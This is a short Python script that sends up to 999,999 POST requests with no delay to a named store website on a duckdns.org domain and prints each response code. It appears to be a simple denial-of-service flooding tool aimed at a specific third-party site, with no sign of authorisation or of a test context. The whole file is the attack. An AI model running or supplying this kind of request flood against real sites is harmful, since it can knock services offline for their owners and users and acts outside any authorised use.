
import requests
import time

url = "https://portsaidstore.duckdns.org/"

data = {
    "key": "value"
}

max_requests = 999999
delay = 0

for i in range(1, max_requests + 1):
    try:
        response = requests.post(
            url,
            data=data,
            timeout=15
        )

        print(
            f"Request {i}: "
            f"Status Code {response.status_code}"
        )

    except requests.exceptions.RequestException as e:
        print(f"Request {i}: Error - {e}")

    if i < max_requests:
        time.sleep(delay)
